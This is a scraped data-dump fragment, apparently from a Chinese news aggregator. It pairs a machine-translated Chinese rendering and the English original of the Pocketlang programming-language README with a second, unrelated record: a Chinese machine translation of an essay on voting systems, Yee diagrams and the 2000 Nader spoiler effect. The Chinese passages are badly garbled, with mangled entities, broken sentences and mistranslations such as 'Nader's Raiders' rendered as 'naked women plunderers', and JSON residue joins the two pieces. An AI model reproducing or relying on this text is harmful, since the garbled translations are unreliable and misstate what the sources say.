SA\u72ec\u7acb\u7684\u6267\u884c\u96f6\u5916\u90e8\u4f9d\u8d56\u9879\u5c31\u50cf\u5b83\u4e00\u6837\u3002 PocketLangVM\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5d4c\u5165\u53e6\u4e00\u4e2a\u6258\u7ba1\u7a0b\u5e8f\u4e2d\u3002\n   \uff03python\u559c\u6b22\u5bfc\u5165\u8bed\u53e5\u3002\u4eceLang\u5bfc\u5165\u65f6\u949f\u5f00\u59cb\uff0c\u9012\u5f52\u6590\u6ce2\u7eb3\u5951\u51fd\u6570\u3002\u5982\u679cn\uff06lt ;. def fib\uff08n\uff09 2\u7136\u540e\u8fd4\u56den\u672b\u7aef\u8fd4\u56defib\uff08n-1\uff09+ fib\uff08n-2\uff09\u7ed3\u675f\uff03\u5c06\u6240\u6709fibonacci\u4ece0\u523010\u6253\u5370\u3002\u5bf9\u4e8e\u6211\u57280 .. 10\u6253\u5370\uff08FIB\uff08i\uff09\uff09\u7ed3\u675f\n  \u60a8\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e0a\u5c1d\u8bd5Pocketlang.it\uff06\uff0339;\u4f7f\u7528Emscripten\u7f16\u8bd1\u7684VM\u7684SA Webassembly\u6784\u5efa\u3002\u6ce8\u610f\uff0c\u5728Webassembly\u7248\u672c\u7684\u8bed\u8a00\u4e2d\uff0c\u67d0\u4e9b\u529f\u80fd\uff08\u8f93\u5165\uff0c\u6587\u4ef6\u5904\u7406\uff0c\u76f8\u5bf9\u5bfc\u5165\u7b49\uff09\u5df2\u7981\u7528\uff0c\u5177\u6709\u6709\u9650\u7684\u5185\u5b58\u5206\u914d\uff0cSTDOUT\u8c03\u7528\u53ef\u80fd\u4f1a\u6162\u3002\n  Pocketlang\u6587\u6863\u6258\u7ba1\u5728https://thakeenathees.github.io/pocketlang/\u4e2d\uff0c\u7531docs / generate.py.note on doc python\u811a\u672c\u751f\u6210\u7684\u6587\u6863\u5206\u652f\u6784\u5efa\uff0c\u8be5\u6587\u6863\u662fWIP\uff0c\u53ef\u80fd\u4e0d\u662f\u6700\u65b0\u3002\n  Pocketlang\u652f\u6301\u5c3e\u547c\u53eb\u4f18\u5316\u3002\u5f53\u51fd\u6570\u8fd4\u56de\u547c\u53eb\u65f6\uff0cCallee\u53ef\u4ee5\u91cd\u65b0\u4f7f\u7528\u6765\u7535\u8005\u548c\uff0339; s\u5806\u6808\u6846\u67b6\uff0c\u8fd9\u5c06\u4f18\u5316\u4eceO\uff08n\uff09\u5230O\uff081\uff09\u548c\u5c3e\u90e8\u9012\u5f52\u7684\u5185\u5b58\u548c\uff0339; LL\u5b8c\u5168\u9632\u6b62sackoverflows\uff0c\u4f46\u5b83\uff06\uff0339; s fasterthen tco disabled\u3002\n \u4ee5\u4e0b\u6240\u6709\u57fa\u51c6\u6d4b\u8bd5\u90fd\u662f\u5728Windows10\uff0864bit\uff09\uff0c\u534e\u7855N552VX\uff0c\u82f1\u7279\u5c14\u6838\u5fc3I7-6700HQ 2.6GHzwith 12GB Sodimm RAM\u4e2d\u7684\u6240\u6709\u57fa\u51c6\u3002\u8bed\u8a00\u7248\u672c\u662f\uff1apocketlang\uff08alpha\uff09\uff0cwren v0.3.0\uff0cpython v3.7.4\uff0cRuby v2.7.2\u3002\n  \u7528\u4e8e\u8fd0\u884c\u57fa\u51c6\u6d4b\u8bd5\u7684\u6e90\u6587\u4ef6\u53ef\u4ee5\u5728Test / Benchmarks /\u76ee\u5f55\u4e2d\u627e\u5230\u3002\u5b83\u4eec\u5728\u6d4b\u8bd5\u76ee\u5f55\u4e2d\u4f7f\u7528\u4e86\u4e00\u4e2a\u5c0fpython\u811a\u672c\u8fd0\u884c\u3002 \n\u5b83\u53ef\u4ee5\u4ece\u6e90\u7248\u672c\u8f7b\u677e\u6784\u5efa\uff0c\u6ca1\u6709\u4efb\u4f55\u4f9d\u8d56\u9879\uff0c\u6216\u8005\u5bf9\u4e8eC99\u517c\u5bb9\u7f16\u8bd1\u5668\u7684\u5176\u4ed6\u8981\u6c42xcept\u3002\u5b83\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u7f16\u8bd1\u3002\n       \u8981\u5728Windows\u4e0a\u8fd0\u884cMINDW\uff0c\u60a8\u9700\u8981\u5728\u60a8\u7684\u8def\u5f84\u4e2d\u8fdb\u884c\u5236\u4f5c\u5e76\u627e\u5230UNIX\u5de5\u5177\u3002\u60a8\u53ef\u4ee5\u4eceMSYS2\u6216CYGWIN\u83b7\u53d6\u3002\u8fd0\u884cSET PATH =\uff06lt; path-to-env / usr / bin /\uff06gt ;;\uff05path\uff05\uff06amp;\uff06amp;\u5236\u4f5c\uff0c\u8fd9\u5c06\u8986\u76d6\u7cfb\u7edf\u67e5\u627e\u547d\u4ee4\u67e5\u627e\u5f53\u524d\u4f1a\u8bdd\u7684\u547d\u4ee4\uff0c\u5e76\u8fd0\u884cmake\u811a\u672c\u3002\n   \u60a8\u4e0d\u5fc5\u4eceVisual Studio .NET Developer\u547d\u4ee4\u63d0\u793a\u7b26\uff0cIT\uff06\uff0339; ll search for msvs\u5b89\u88c5\u8def\u5f84\u548c\u8bbe\u7f6e\u6784\u5efa\u73af\u5883\u3002\n     Mark W. Bailey\uff0cNathan C. Weston\uff082001\u5e746\u6708\uff09\u6280\u672f\u62a5\u544a\u3002\u5c3e\u90e8\u9012\u5f52\u7684\u6027\u80fd\u6548\u76ca\u5220\u9664\u4e2d\u6587\u8bed\u8a00[\u5728\u7ebf]\u5728http://cs.hamilton.edu/~mbailey/pubs/techreps/tr-2001-2.pdf\n  Bob Nystrom\u3002\uff082011\uff09Pratt\u89e3\u6790\u5668\uff1a\u8868\u8fbe\u89e3\u6790\u7b80\u5355\uff09\n \u5361\u7f57\u5c14E.\uff08\u4e54\u5c14\u592b\u6cb3\u6d41\u5927\u5b66\uff09\uff0cP. Oser\u3002 Shunting Yard\u7b97\u6cd5[\u5728\u7ebf]\u5728http://mathcenter.oxford.emory.edu/site/cs171/shuntingyardalgorithm/\uff082020\u5e749\u6708\uff09 ", "note_en": "Pocketlang is a small (~3000 semicolons) and  fastfunctional language written in C. It&#39;s syntactically similar to Ruby and it canbe learned  within 15 minutes.Including the compiler, bytecode VM and runtime, it&#39;s a standalone executablewith zero external dependencies just as it&#39;s self descriptive name. The pocketlangVM can be embedded in another hosting program very easily.\n   # Python like import statement. from  lang  import  clock  as  now # A recursive fibonacci function. def  fib ( n )  if  n &lt;  2  then  return  n  end  return  fib ( n- 1 ) +  fib ( n- 2 ) end # Prints all fibonacci from 0 to 10 exclusive. for  i  in  0.. 10  print ( fib ( i ) ) end\n  You can  try pocketlang on your browser.It&#39;s a  WebAssembly build of the VM compiled using  emscripten.Note that in the webassembly version of the language, some features (input, file handling, relative import, etc.)have disabled, has limited memory allocations, and the stdout calls might be slower.\n  The pocketlang documentation is hosted at  https://thakeenathees.github.io/pocketlang/ whichis built from the  docs branch generated by a little python script at  docs/generate.py.Note that the documentations are WIP and might not be up to date.\n  Pocketlang supports  tail call  optimization.When a function returns a call, the callee can re-use the caller&#39;s stack frame, this will optimize memory from O(n) to O(1)and for  tail recursive it&#39;ll completely prevent stackoverflows and yet it&#39;s fasterthen tco disabled.\n All the below benchmarks are ran on, Windows10 (64bit), ASUS N552VX, Intel Core i7-6700HQ 2.6GHzwith 12GB SODIMM Ram. And the language versions are: pocketlang (pre-alpha), wren v0.3.0,python v3.7.4, ruby v2.7.2.\n  The source files used to run benchmarks could be found at  test/benchmarks/directory. They were ran using a small python script in the test directory.\n  It can be build from source easily without any dependencies, or additional requirementsexcept for a c99 compatible compiler. It can be compiled with the following command.\n       To run make file on windows with  mingw, you require  make and  find unix tools in your path.Which you can get from  msys2 or  cygwin. Run set PATH=&lt;path-to-env/usr/bin/&gt;;%PATH% &amp;&amp; make, this will override the system  find command withunix  find for the current session, and run the  make script.\n   You don&#39;t have to run the script from a Visual Studio .NET developer command prompt, It&#39;ll searchfor the MSVS installation path and setup the build enviornment.\n     Mark W. Bailey, Nathan C. Weston (June 2001) Technical report.  Performance Benefits of Tail Recursion Removal inProcedural Languages [online] Available at  http://cs.hamilton.edu/~mbailey/pubs/techreps/TR-2001-2.pdf\n  Bob Nystrom.(2011)  Pratt Parsers: Expression Parsing Made Easy [online] Avaliable at  http://journal.stuffwithstuff.com/2011/03/19/pratt-parsers-expression-parsing-made-easy/ (Accessed December 2020)\n Carol E. (Wolf of Pace University), P. Oser.  The Shunting Yard Algorithm [online] Available at  http://mathcenter.oxford.emory.edu/site/cs171/shuntingYardAlgorithm/ (Accessed September 2020)", "posttime": "2021-06-22 15:51:36", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "pocketlang,\u8fd0\u884c", "title": "Pocketlang. ", "title_en": "Pocketlang", "transed": 1, "url": "https://github.com/ThakeeNathees/pocketlang", "via": "", "real_tags": ["\u8fd0\u884c"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1067381, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u4eec\u5e0c\u671b\u901a\u8fc7\u4e3e\u884c\u9009\u4e3e\u6765\u56de\u7b54\u54ea\u4e9b\u95ee\u9898\uff1f\u9009\u4e3e\u662f\u6211\u4eec\u9009\u62e9\u6211\u4eec\u7684\u653f\u5e9c\uff0c\u4f46\u5b83\u4eec\u4e0d\u662f\u552f\u4e00\u7684\u65b9\u6cd5\u3002\u6211\u4eec\u4e3e\u884c\u9009\u4e3e\uff0c\u56e0\u4e3a\u6211\u4eec\u76f8\u4fe1\u4ed6\u4eec\u544a\u8bc9\u6211\u4eec\u4e00\u4e9b\u6709\u6743\u4ee5\u7ea6\u4f1a\u6216\u9057\u4f20\u6ca1\u6709\u7684\u65b9\u5f0f\u63a7\u5236\u6211\u4eec\u7684\u653f\u5e9c\u3002\u4f46\u4e0d\u540c\u7684\u6295\u7968\u65b9\u5f0f\u56de\u7b54\u4e86\u4e0d\u540c\u7684\u95ee\u9898\u3002\n \u53ef\u89c6\u5316\u6211\u4eec\u7684\u6295\u7968\u7cfb\u7edf\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u4e86\u89e3\u6bcf\u4e2a\u7cfb\u7edf\u8981\u6c42\u5851\u9020\u6211\u4eec\u5f97\u5230\u7684\u7b54\u6848\u7684\u95ee\u9898\u3002\u901a\u8fc7\u6839\u636e\u5019\u9009\u4eba\u76f8\u5bf9\u4e8e\u200b\u200b\u5f7c\u6b64\u7684\u5730\u65b9\u8fdb\u884c\u6bd4\u8d5b\uff0c\u60a8\u53ef\u4ee5\u4e86\u89e3\u6211\u4eec\u7684\u6295\u7968\u7cfb\u7edf\u7ed9\u6211\u4eec\u9009\u4e3e\u7684\u4eba\u7684\u6fc0\u52b1\u63aa\u65bd\u3002\u6211\u4eec\u5c06\u901a\u8fc7\u6a21\u62df\u8bb8\u591a\u9009\u4e3e\u5e76\u770b\u5230\u7ed3\u679c\u5982\u4f55\u53d8\u5316\uff0c\u4ece\u800c\u6839\u636e\u666e\u901a\u9009\u6c11\u7684\u4f4d\u7f6e\u6765\u63a2\u7d22\u4e0d\u540c\u7684\u7cfb\u7edf\u3002\n  \u8be5\u56fe\u663e\u793a\u4e86\u5355\u4e00\u9009\u4e3e\u3002\u5f69\u8272\u5706\u5708\u4ee3\u8868\u5019\u9009\u4eba\u548c\u9009\u6c11\u5728\u4e00\u4e9b\u62bd\u8c61\u7a7a\u95f4\u4e2d\u7684\u4f4d\u7f6e\u3002\u60f3\u8c61\u4e00\u4e0b\uff0cY\u8f74\u8861\u91cf\u5019\u9009\u4eba\u5728\u73af\u5883\u4fdd\u62a4\u4e0a\u7684\u91cd\u70b9\u662f\u5982\u4f55\u805a\u7126\uff0cX\u8f74\u8861\u91cf\u5176\u5bf9\u516c\u53f8\u7a0e\u7387\u7b49\u5176\u4ed6\u95ee\u9898\u7684\u4f4d\u7f6e\u3002\u9009\u6c11\u66f4\u559c\u6b22\u66f4\u63a5\u8fd1\u4ed6\u4eec\u7684\u5019\u9009\u4eba\u3002\u5355\u51fb\u6b64\u56fe\u4e2d\u7684\u4efb\u610f\u4f4d\u7f6e\u6a21\u62df\u4e86\u4e00\u4e2a\u65b0\u7684\u9009\u4e3e\uff0c\u5176\u4e2d\u666e\u901a\u9009\u6c11\u662f\u60a8\u5355\u51fb\u7684\u4f4d\u7f6e\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u6211\u4eec\u5728\u90a3\u4e00\u70b9\u4e0a\u5e73\u5747\u6240\u6709\u9009\u6c11\u7684\u4f4d\u7f6e\uff0c\u4f46\u5982\u679c\u4f60\u70b9\u51fb\u540c\u4e00\u4e2a\u70b9\u51e0\u6b21\uff0c\u4f60\u4f1a\u770b\u5230\u6bcf\u4e2a\u9009\u6c11\u7684\u4f4d\u7f6e\u53ef\u4ee5\u6539\u53d8\u3002\n \u770b\u7740\u4e00\u4e2a\u6a21\u62df\u7684\u9009\u4e3e\u5e76\u6ca1\u6709\u544a\u8bc9\u6211\u4eec\uff0c\u6240\u4ee5\u6211\u4eec\u5c06\u4f7f\u7528\u79f0\u4e3aYee\u56fe\u7684\u4e1c\u897f\u6765\u5c55\u793a\u7ed3\u679c\u5982\u4f55\u5728\u8bb8\u591a\u6a21\u62df\u9009\u4e3e\u4e2d\u53d8\u5316\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u5e73\u5747\u9009\u6c11\u7684\u4f4d\u7f6e\u3002\n 2000\u5e74\u7f8e\u56fd\u603b\u7edf\u9009\u4e3e\u662f\u5386\u53f2\u6027\u7684\uff0c\u90e8\u5206\u539f\u56e0\u662f\u62c9\u5c14\u592b\u00b7\u7eb3\u4f2f\u9009\u62e9\u5ffd\u89c6\u8fd9\u4e9b\u6fc0\u52b1\u63aa\u65bd\u3002\u9884\u8ba1\u5c06\u6210\u4e3a\u4e54\u6cbbW\u5e03\u4ec0\u548c\u6208\u5c14\u4e4b\u95f4\u7684\u7d27\u5f20\u79cd\u65cf\uff0c\u4f46\u7eb3\u7c73\u961f\u6b63\u5728\u4f5c\u4e3a\u7b2c\u4e09\u65b9\u5019\u9009\u4eba\u7ade\u9009\u3002\u9886\u5bfc\u9009\u4e3e\uff0c\u4e00\u7fa4\u81ea\u6211\u786e\u5b9a\u7684\u201c\u7eb3\u6492\u7a81\u88ad\u8005\u201d\u5199\u4e86\u4e00\u4e2a\u4ee4\u4eba\u9e23\u53eb\u7684\u516c\u5f00\u4fe1\uff0c\u8981\u6c42\u4ed6\u8f8d\u5b66\u3002\u4ed6\u4eec\u62c5\u5fc3\u4ed6\u5c06\u628a\u9009\u4e3e\u9001\u5230\u5e03\u4ec0\u3002\n \u73b0\u5728\u5f88\u6e05\u695a\uff0c\u4f60\u53ef\u80fd\u4f1a\u8ba9\u767d\u5bab\u7ed9\u5e03\u4ec0\u3002\u56e0\u6b64\uff0c\u60a8\u5c06\u5927\u5927\u91cd\u65b0\u542f\u52a8\u60a8\u81f4\u529b\u4e8e\u6574\u4e2a\u4ee4\u4eba\u60ca\u8bb6\u7684\u804c\u4e1a\u7684\u793e\u4ea4\u8fdb\u5c55\u3002\u4e3a\u4e86\u8ba9\u6574\u4e2a\u6210\u5e74\u751f\u6d3b\u7684\u5171\u540c\u5584\u826f\u7684\u5229\u76ca\uff0c\u4f60\u727a\u7272\u4e86......\u8fd9\u786e\u5b9e\u662f\u4e00\u4e2a\u6b8b\u9177\u7684\u8bbd\u523a\uff0c\u5982\u679c\u4f60\u7684\u4e3b\u8981\u9057\u4ea7\u662f\u4ece\u6700\u591a\u6700\u591a\u4f53\u73b0\u4f60\u7684\u54f2\u5b66\uff0c\u6208\u5c14\u7684\u5019\u9009\u4eba\u7684\u80dc\u5229\uff0c\u5e76\u7ed9\u884c\u653f\u90e8\u95e8\u4e00\u8d2f\u62b5\u5236\u4f60\u7684\u8fdb\u6b65\u7406\u60f3\u7684\u515a\u3002 1\n \u585e\u62c9\u514b\u4ff1\u4e50\u90e8\u603b\u88c1\u5361\u5c14\u6559\u7687\u6073\u6c42\u7eb3\u7c73\u4eba\u91cd\u65b0\u8003\u8651\u4ed6\u7684\u7ade\u9009\u6218\u7565\u3002 \n\u4f60\u627f\u8bfa\u4f60\u4e0d\u4f1a\u4f5c\u4e3a\u6270\u6d41\u677f\u7ade\u9009\uff0c\u5e76\u907f\u514d\u6447\u6446\u72b6\u6001\u3002\u60a8\u6700\u8fd1\u7684\u7ade\u9009\u8a00\u8bba\u548c\u7ade\u9009\u8ba1\u5212\u660e\u786e\u8868\u793a\u60a8\u5df2\u7ecf\u6298\u65ad\u4e86\u8fd9\u4e00\u8d28\u91cf......\u4e0d\u8d1f\u8d23\u4efb\uff0c\u56e0\u4e3a\u6211\u627e\u5230\u4e86\u4f60\u7684\u7b56\u7565\uff0c\u6211\u63a5\u53d7\u4e86\u4f60\u771f\u6b63\u76f8\u4fe1\u5b83\u3002\u8bf7\u63a5\u53d7\u8fd9\u4e2a\u56fd\u5bb6\u7684\u7edd\u5927\u591a\u6570\u73af\u5883\u8fd0\u52a8\uff0c\u771f\u6b63\u76f8\u4fe1\u60a8\u7684\u7b56\u7565\u6709\u7f3a\u9677\uff0c\u5371\u9669\u548c\u9c81\u83bd\u3002 2\n The Republican Leadership Council ran campaign ads featuring Nader, believing that the more people that voted for Nader, the better chance Bush had at winning the election.\n \u7eb3\u8fea\u5c14\uff0c\u8fd0\u8425\u4f4e\u9884\u7b97\u6d3b\u52a8\uff0c\u5e76\u4e0d\u64ad\u51fa\u4ed6\u81ea\u5df1\u7684\u7535\u89c6\u5e7f\u544a\uff0c\u5e76\u4e14rlc\u53ef\u80fd\u6700\u7ec8\u5728\u7eb3\u591a\u4eba\u81ea\u5df1\u7684\u4eb2\u7eb3\u7c73\u5a92\u4f53\u4e0a\u82b1\u8d39\u66f4\u591a\u3002 3.\n \u4e3a\u4ec0\u4e48\u73af\u4fdd\u4e3b\u4e49\u8005\uff0c\u76f8\u5bf9\u900f\u660e\u7684\u4e0e\u7eb3\u7c73\u76f8\u4f3c\uff0c\u6073\u6c42\u4ed6\u4e0d\u8dd1\uff1f\u4e3a\u4ec0\u4e48\u5171\u548c\u515a\u4eba\u8bd5\u56fe\u8ba9\u4eba\u4eec\u6295\u7968\u7ed9\u4ed6\u4eec\u7684\u4e00\u4e2a\u5bf9\u624b\uff1f\u6240\u6709\u8fd9\u4e9b\u4eba\u90fd\u8ba4\u4e3a\u7eb3\u7c73\u7684\u9009\u7968\u5c06\u5177\u6709\u9009\u4e3e\u704c\u6728\u7684\u6548\u679c\uff0c\u56e0\u4e3a\u6240\u8c13\u7684\u6270\u6d41\u6548\u679c\u3002\n  \u8fd9\u79cd\u53ef\u89c6\u5316\u79f0\u4e3aYEE\u56fe\u3002\u5982\u679c\u666e\u901a\u9009\u6c11\u5728\u90a3\u4e00\u70b9\uff0c\u80cc\u666f\u662f\u57fa\u4e8e\u8c01\u8d62\u7684\u3002\u5982\u679c\u6709\u4e00\u4e2a\u9886\u5e26\uff0c\u80cc\u666f\u5c06\u662f\u7070\u8272\u7684;\u9ed1\u7ebf\u53ea\u662f\u8ba9\u6211\u4eec\u6709\u4e00\u79cd\u4e2d\u95f4\u7684\u610f\u4e49\u3002\n \u901a\u8fc7\u6a21\u62df\u80cc\u666f\u7684\u6bcf\u4e2a\u5c0f\u533a\u7684\u9009\u4e3e\u6765\u751f\u6210\u56fe\uff0c\u5176\u4e2d\u9009\u6c11\u968f\u673a\u5206\u5e03\u5728\u8be5\u5c0f\u533a\u5468\u56f4\u3002\u6211\u5e0c\u671b\u7406\u60f3\u7684\u6295\u7968\u65b9\u5f0f\u5c06\u6700\u63a5\u8fd1\u4efb\u4f55\u7ed9\u5b9a\u7ec6\u80de\u7684\u5019\u9009\u4eba\u9009\u51fa\u3002\n \u8fd9\u4e9b\u56fe\u8868\u5e76\u4e0d\u662f\u5bf9\u6211\u4eec\u7684\u4efb\u4f55\u9009\u4e3e\u90fd\u975e\u5e38\u8054\u7cfb\u6211\u4eec\uff0c\u4f46\u4ed6\u4eec\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u63a2\u7d22\u9009\u4e3e\u5982\u4f55\u901a\u8fc7\u6211\u4eec\u9009\u62e9\u7684\u6295\u7968\u65b9\u5f0f\u6765\u5851\u9020\u3002\u57282000\u5e74\u9009\u4e3e\u4e2d\uff0c\u4f7f\u7528\u79f0\u4e3a\u591a\u9879\u6295\u7968\u7684\u65b9\u6cd5\u8ba1\u7b97\u6240\u6709\u9009\u7968\uff0c\u6bcf\u4e2a\u9009\u6c11\u9009\u62e9\u4ed6\u4eec\u6700\u559c\u6b22\u7684\u5019\u9009\u4eba\u548c\u6700\u591a\u6295\u7968\u7684\u5019\u9009\u4eba\u3002\u5728\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u591a\u6b21\u6295\u7968\u8981\u6c42\u4ed6\u4eec\u6700\u6709\u5229\u7684\u5019\u9009\u8005\u7684\u9009\u6c11\uff0c\u4f46\u5e76\u200b\u200b\u6ca1\u6709\u95ee\u4ed6\u4eec\u5bf9\u5176\u5176\u4f59\u5019\u9009\u4eba\u7684\u770b\u6cd5\u3002\u8fd9\u4f7f\u5f97\u591a\u4e2a\u9009\u4e3e\u96be\u4ee5\u627e\u5230\u59a5\u534f\u3002 \n\u5982\u679c\u53ea\u6709\u5e03\u4ec0\u548c\u6208\u5c14\u4e00\u76f4\u5728\u5954\u8dd1\uff0c\u6bd4\u8d5b\u672c\u6765\u5c31\u662f\u7b80\u5355\u7684\uff0c\u80dc\u5229\u8005\u5c06\u662f\u9760\u8fd1\u8206\u8bba\u4e2d\u5fc3\u7684\u4eba\u3002\u4f46\u662f\u5f53\u6211\u4eec\u8003\u8651\u7eb3\u4e86\u4eba\u65f6\uff0c\u5947\u602a\u7684\u4e8b\u60c5\u5c31\u4f1a\u5f00\u59cb\u53d1\u751f\u3002\n  \u56e0\u4e3a\u7eb3\u7c73\u662f\u601d\u60f3\u504f\u597d\u4e8e\u6208\u5c14\uff0c\u56e0\u6b64\u9009\u6c11\u66f4\u6709\u53ef\u80fd\u4ece\u8840\u8165\u5207\u6362\u5230\u516b\u5206\u4e4b\u4e00\u3002\u53d6\u51b3\u4e8e\u6211\u4eec\u76f8\u4fe1\u666e\u901a\u9009\u6c11\u7684\u5730\u65b9\u53ef\u80fd\u65e0\u5173\u7d27\u8981\uff0c\u4f46\u5982\u679c\u6211\u4eec\u8ba4\u4e3a\u8206\u8bba\u662f\u5e03\u4ec0\u548c\u6208\u5c14\u4e4b\u95f4\u7684\u67d0\u4e2a\u5730\u65b9\uff0c\u8fd9\u53ef\u80fd\u6709\u53ef\u80fd\u5e2e\u52a9\u5e03\u4ec0\u8d62\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u591a\u6b21\u6295\u7968\u65e0\u6cd5\u8bc6\u522b\u8bb8\u591a\u9009\u6c11\uff08\u5982Carl Pope\u548c\u88f8\u5973\u63a0\u593a\u8005\u7684\u96f7\u6208\u5c14\uff09\uff0c\u6208\u5c14\u662f\u7eb3\u7c73\u548c\u704c\u6728\u4e4b\u95f4\u7684\u6298\u8877\u3002\u8fd9\u662f\u73af\u4fdd\u4e3b\u4e49\u8005\u5bb3\u6015\u7684\u5267\u900f\uff0c\u4ee5\u53ca\u4e3a\u4ec0\u4e48\u5171\u548c\u515a\u4eba\u60f3\u8981\u653e\u5927\u7eb3\u7c73\u8baf\u3002\n \u8bb8\u591a\u4eba\u4ece\u5267\u900f\u6548\u5e94\u4e2d\u53d6\u51fa\u7684\u8bfe\u7a0b\u662f\u7b2c\u4e09\u65b9\u5019\u9009\u4eba\u635f\u5bb3\u4e86\u4ed6\u4eec\u5173\u5fc3\u7684\u5e73\u53f0\uff0c\u4f46\u5267\u900f\u6548\u5e94\u4e0d\u4f1a\u53d1\u751f\u5728\u6bcf\u4e2a\u6295\u7968\u7cfb\u7edf\u4e2d\u3002\u867d\u7136\u591a\u4e2a\u6295\u7968\u4e2d\u5b58\u5728\u8fd9\u79cd\u6548\u679c\u7684\u7248\u672c\uff0c\u5e76\u4e14\u5728\u5373\u65f6\u5f84\u6d41\u6295\u7968\u4e2d\uff0c\u5176\u4ed6\u7cfb\u7edf\uff0c\u5982\u6279\u51c6\u6295\u7968\uff0c\u4f46\u5176\u4ed6\u7cfb\u7edf\u6ca1\u6709\u8fd9\u4e2a\u95ee\u9898\u3002\n \u6279\u51c6\u8868\u51b3\u9009\u7968\u770b\u8d77\u6765\u975e\u5e38\u7c7b\u4f3c\u4e8e\u591a\u79cd\u6295\u7968\u7684\u9009\u7968\uff0c\u4f46\u6295\u7968\u6d89\u53ca\u9009\u62e9\u5c3d\u53ef\u80fd\u591a\u7684\u5019\u9009\u4eba\uff0c\u800c\u4e0d\u662f\u53ea\u6709\u60a8\u7684\u6700\u7231\u3002\u5982\u679c\u591a\u6b21\u6295\u7968\u8981\u6c42\u9009\u6c11\u662f\u4ed6\u4eec\u6700\u559c\u6b22\u7684\u5019\u9009\u4eba\uff0c\u6279\u51c6\u6295\u7968\u662f\u8be2\u95ee\u8c01\u9009\u6c11\u5c06\u63a5\u53d7\u4f5c\u4e3a\u80dc\u5229\u8005\u3002\u8be5\u95ee\u9898\u7684\u7ed3\u6784\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u66f4\u591a\u6211\u4eec\u9700\u8981\u8bc6\u522b\u59a5\u534f\u7684\u4fe1\u606f\u3002\u4e0b\u56fe\u663e\u793a\u4e86\u540c\u4e00\u7ec4\u5019\u9009\u4eba\u7684\u52a8\u6001\uff0c\u800c\u662f\u5728\u9009\u4e3e\u4e2d\u8fdb\u884c\u6279\u51c6\u6295\u7968\u3002 4.\n  \u6279\u51c6\u6295\u7968\u5177\u6709\u91cd\u8981\u7684\u8d22\u4ea7;\u5982\u679c\u5019\u9009\u4eba\u6ca1\u6709\u8d62\u5f97\u6bd4\u8d5b\uff0c\u4ed6\u4eec\u4e0d\u4f1a\u5f71\u54cd\u7ed3\u679c\u3002\u60a8\u53ef\u4ee5\u5728\u4e0a\u56fe\u4e2d\u770b\u5230\u8fd9\u4e00\u70b9;\u5019\u9009\u5019\u9009\u4ebaA\u5468\u56f4\u53ef\u4ee5\u5c06\u5c0f\u533a\u4eceB\u6539\u53d8\u4e3aa\uff0c\u4f46\u5b83\u6c38\u8fdc\u4e0d\u4f1a\u5c06\u4efb\u4f55\u5c0f\u533a\u4eceB\u4eceB\u5230C.\u5c1d\u8bd5\u79fb\u52a8\u540a\u5e26\uff0c\u89c2\u770b\u4e1b\u6797\u548c\u8840\u8165\u4e4b\u95f4\u7684\u7ebf\u8def\u3002\u9664\u4e86\u73b0\u5728\u8d62\u5f97\u80dc\u5229\u7684\u5730\u533a\uff0c\u8fd9\u6761\u7ebf\u6c38\u8fdc\u4e0d\u4f1a\u79fb\u52a8\u3002\n \u57282000\u5e74\u9009\u4e3e\u4e2d\uff0c\u8fd9\u79cd\u7a33\u5b9a\u6027\u5c5e\u6027\u5c06\u610f\u5473\u7740\u5171\u548c\u515a\u4eba\u4e0d\u4f1a\u6709\u7406\u7531\u9f13\u52b1\u4eba\u4eec\u6295\u7968\u7ed9\u4ed6\u4eec\u7684\u4e00\u4e2a\u5bf9\u624b\u3002\u73af\u4fdd\u4e3b\u4e49\u8005\u53ef\u80fd\u4f1a\u6b22\u8fce\u53e6\u4e00\u4e2a\u5019\u9009\u4eba\u4e3a\u73af\u5883\u53f8\u6cd5\u4e89\u593a\uff0c\u56e0\u4e3a\u5173\u5fc3\u73af\u5883\u7684\u9009\u6c11\u4e0d\u5fc5\u5728\u6208\u5c14\u548c\u7eb3\u7c73\u4e4b\u95f4\u8fdb\u884c\u9009\u62e9\u3002\u6279\u51c6\u6295\u7968\u4f1a\u7ed9\u4ed6\u4eec\u4e00\u79cd\u8868\u8fbe\u4ed6\u4eec\u5bf9\u4efb\u4f55\u4e00\u79cd\u7684\u65b9\u5f0f\u3002\n \u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\uff0c\u7f8e\u56fd\u5c06\u591a\u9879\u6295\u7968\u89c6\u4e3a\u552f\u4e00\u7684\u9009\u9879\uff0c\u4f46\u8fd9\u6b63\u5728\u53d1\u751f\u53d8\u5316\u3002\u6cd5\u6208\u548c\u5723\u8def\u6613\u65af\u7684\u9009\u6c11\u91cd\u7ec4\u4ed6\u4eec\u7684\u9009\u4e3e\u4f7f\u7528\u6279\u51c6\u6295\u7968\uff0c\u4ee5\u53ca\u65e7\u91d1\u5c71\uff0c\u5965\u65af\u6c40\uff0c\u897f\u96c5\u56fe\uff0c\u5bc6\u82cf\u91cc\u5dde\u548c\u72b9\u4ed6\u5dde\u7684\u9009\u6c11\u6b63\u5728\u52aa\u529b\u6539\u53d8\u4ed6\u4eec\u7684\u6295\u7968\u65b9\u5f0f\u3002 You might soon have an opportunity to choose how your government is elected.\u60a8\u5e0c\u671b\u60a8\u7684\u6295\u7968\u7cfb\u7edf\u9f13\u52b1\u4ec0\u4e48\uff1f \n\u6279\u51c6\u6295\u7968\u6709\u53e6\u4e00\u4e2a\u53c2\u6570\uff0c\u6211\u4eec\u4e0d\u5fc5\u5728\u591a\u79cd\u6295\u7968\u7684\u4e0a\u4e0b\u6587\u4e2d\u601d\u8003; \u4f60\u6709\u591a\u63a5\u53d7\uff1f 